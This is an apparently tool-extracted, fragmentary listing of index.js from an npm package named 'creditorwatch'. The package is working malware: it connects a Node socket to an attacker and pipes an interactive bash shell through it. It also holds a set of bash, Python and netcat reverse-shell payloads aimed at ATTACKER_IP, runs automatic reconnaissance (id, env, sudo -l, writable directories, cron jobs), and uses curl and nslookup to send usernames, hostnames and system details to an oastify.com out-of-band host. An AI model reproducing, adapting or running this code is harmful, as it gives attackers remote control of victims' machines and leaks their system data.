// File: tmp/tmpbhul99z2/creditorwatch/package/index.js
// ======================================================================
Line 1: _tmp_5 = require("child_process")
Line 2: const net = require("net")
Line 10: _tmp_6.push("echo '=== REVERSE SHELL ESTABLISHED ==='")
Line 11: _tmp_6.push("echo '=== SYSTEM INFORMATION ==='")
Line 12: _tmp_6.push("whoami")
Line 13: _tmp_6.push("id")
Line 14: _tmp_6.push("uname -a")
Line 15: _tmp_6.push("hostname")
Line 16: _tmp_6.push("pwd")
Line 17: _tmp_6.push("echo '=== DIRECTORY LISTING ==='")
Line 18: _tmp_6.push("ls -la")
Line 19: _tmp_6.push("echo '=== NETWORK INFORMATION ==='")
Line 20: _tmp_6.push("ifconfig || ip addr show")
Line 21: _tmp_6.push("echo '=== PROCESS INFORMATION ==='")
Line 22: _tmp_6.push("ps aux | head -10")
Line 23: _tmp_6.push("echo '=== ENVIRONMENT VARIABLES ==='")
Line 24: _tmp_6.push("env | head -10")
Line 25: _tmp_6.push("echo '=== SUDO PRIVILEGES ==='")
Line 26: _tmp_6.push("sudo -l 2>/dev/null || echo 'Cannot check sudo privileges'")
Line 27: _tmp_6.push("echo '=== WRITABLE DIRECTORIES ==='")
Line 28: _tmp_6.push("find / -writable -type d 2>/dev/null | head -10")
Line 29: _tmp_6.push("echo '=== CRON JOBS ==='")
Line 30: _tmp_6.push("crontab -l 2>/dev/null || echo 'No crontab for current user'")
Line 31: _tmp_6.push("echo '=== SHELL READY FOR INTERACTION ==='")
Line 32: _tmp_6.push("")
Line 38: const client = new net.Socket()
Line 39: {
      console.log('Connected to attacker - executing auto commands');
      
      // Spawn a shell
      const shell = spawn('/bin/bash', ['-i']);
      
      // Pipe shell output to client
      shell.stdout.pipe(client);
      shell.stderr.pipe(client);
      
      // Pipe client input to shell
      client.pipe(shell.stdin);
      
      // Execute auto commands immediately upon connection
      setTimeout(() => {
        autoCommands.forEach((cmd, index) => {
          setTimeout(() => {
            shell.stdin.write(cmd + '\n');
          }, index * 1000); // 1 second delay between commands
        });
      }, 1000); // Wait 1 second after connection before starting commands
      
      client.on('close', () => {
        shell.kill();
      });
    }
Line 43: const shell = spawn('/bin/bash', ['-i'])
Line 46: shell.stdout.pipe(client)
Line 47: shell.stderr.pipe(client)
Line 50: client.pipe(shell.stdin)
Line 53: setTimeout(() => {
        autoCommands.forEach((cmd, index) => {
          setTimeout(() => {
            shell.stdin.write(cmd + '\n');
          }, index * 1000); // 1 second delay between commands
        });
      }, 1000)
Line 54: {
          setTimeout(() => {
            shell.stdin.write(cmd + '\n');
          }, index * 1000); // 1 second delay between commands
        }
Line 55: setTimeout(() => {
            shell.stdin.write(cmd + '\n');
          }, index * 1000)
Line 56: shell.stdin.write(cmd + '\n')
Line 62: shell.kill()
Line 75: const reverseShellPayloads = [
  // Bash reverse shell with auto commands
  `bash -c 'exec bash -i &>/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} <&1; (sleep 2; echo "=== AUTO RECON ==="; whoami; id; uname -a; hostname; pwd; ls -la; echo "=== READY ===") &'`,
  
  // Python reverse shell with auto commands
  `python3 -c "
import socket,subprocess,os,time
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('${ATTACKER_IP}',${ATTACKER_PORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
# Send auto commands
auto_cmds=['whoami','id','uname -a','hostname','pwd','ls -la']
for cmd in auto_cmds:
    try:
        result=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT)
        s.send(f'AUTO: {cmd}\\n'.encode())
        s.send(result)
        s.send(b'\\n')
        time.sleep(0.5)
    except: pass
s.send(b'=== SHELL READY ===\\n')
p=subprocess.call(['/bin/bash','-i'])
"`,
  
  // Netcat with command injection
  `bash -c 'mkfifo /tmp/f; cat /tmp/f | /bin/ba...
Line 77: _tmp_7.push(<operator>.formatString("bash -c 'exec bash -i &>/dev/tcp/", ATTACKER_IP, "/", ATTACKER_PORT, " <&1; (sleep 2; echo "=== AUTO RECON ==="; whoami; id; uname -a; hostname; pwd; ls -la; echo "=== READY ===") &'"))
Line 80: _tmp_7.push(<operator>.formatString("python3 -c "
import socket,subprocess,os,time
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('", ATTACKER_IP, "',", ATTACKER_PORT, "))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
# Send auto commands
auto_cmds=['whoami','id','uname -a','hostname','pwd','ls -la']
for cmd in auto_cmds:
    try:
        result=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT)
        s.send(f'AUTO: {cmd}\\n'.encode())
        s.send(result)
        s.send(b'\\n')
        time.sleep(0.5)
    except: pass
s.send(b'=== SHELL READY ===\\n')
p=subprocess.call(['/bin/bash','-i'])
""))
Line 102: _tmp_7.push(<operator>.formatString("bash -c 'mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | tee /tmp/output | nc ", ATTACKER_IP, " ", ATTACKER_PORT, " > /tmp/f; (sleep 3; echo "whoami; id; uname -a; hostname; pwd; ls -la" > /tmp/f) &'"))
Line 107: _tmp_8.push("nslookup $(whoami).$(hostname).gau5jjim899y61s6jll79cumyd44svgk.oastify.com")
Line 108: _tmp_8.push("curl http://gau5jjim899y61s6jll79cumyd44svgk.oastify.com/$(whoami)/$(hostname)/ -A "$(id)"")
Line 109: _tmp_8.push("curl http://gau5jjim899y61s6jll79cumyd44svgk.oastify.com/rce-established -d "$(uname -a)"")
Line 114: {
  setTimeout(() => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) console.error(`Recon error [${index}]:`, error.message);
      if (stderr) console.error(`Recon stderr [${index}]:`, stderr);
      if (stdout) console.log(`Recon stdout [${index}]:`, stdout);
    });
  }, index * 1000);
}
Line 115: setTimeout(() => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) console.error(`Recon error [${index}]:`, error.message);
      if (stderr) console.error(`Recon stderr [${index}]:`, stderr);
      if (stdout) console.log(`Recon stdout [${index}]:`, stdout);
    });
  }, index * 1000)
Line 116: exec(cmd, (error, stdout, stderr) => {
      if (error) console.error(`Recon error [${index}]:`, error.message);
      if (stderr) console.error(`Recon stderr [${index}]:`, stderr);
      if (stdout) console.log(`Recon stdout [${index}]:`, stdout);
    })
Line 127: nodeReverseShellWithAutoExec()
Line 133: {
    setTimeout(() => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) console.error(`Shell error [${index}]:`, error.message);
        if (stderr) console.error(`Shell stderr [${index}]:`, stderr);
        if (stdout) console.log(`Shell stdout [${index}]:`, stdout);
      });
    }, index * 3000); // Stagger attempts more
  }
Line 134: setTimeout(() => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) console.error(`Shell error [${index}]:`, error.message);
        if (stderr) console.error(`Shell stderr [${index}]:`, stderr);
        if (stdout) console.log(`Shell stdout [${index}]:`, stdout);
      });
    }, index * 3000)
Line 135: exec(cmd, (error, stdout, stderr) => {
        if (error) console.error(`Shell error [${index}]:`, error.message);
        if (stderr) console.error(`Shell stderr [${index}]:`, stderr);
        if (stdout) console.log(`Shell stdout [${index}]:`, stdout);
      })
Line 147: {
  console.log("Attempting quick recon shell...");
  exec(quickReconShell, (error, stdout, stderr) => {
    if (error) console.error("Quick recon error:", error.message);
    if (stderr) console.error("Quick recon stderr:", stderr);
    if (stdout) console.log("Quick recon stdout:", stdout);
  });
}
Line 149: exec(quickReconShell, (error, stdout, stderr) => {
    if (error) console.error("Quick recon error:", error.message);
    if (stderr) console.error("Quick recon stderr:", stderr);
    if (stdout) console.log("Quick recon stdout:", stdout);
  })
Line 169: {
  console.log("Setting up persistent shell with auto-recon...");
  exec(persistentShellWithRecon, (error, stdout, stderr) => {
    if (error) console.error("Persistent shell error:", error.message);
    if (stderr) console.error("Persistent shell stderr:", stderr);
    if (stdout) console.log("Persistent shell stdout:", stdout);
  });
}
Line 171: exec(persistentShellWithRecon, (error, stdout, stderr) => {
    if (error) console.error("Persistent shell error:", error.message);
    if (stderr) console.error("Persistent shell stderr:", stderr);
    if (stdout) console.log("Persistent shell stdout:", stdout);
  })
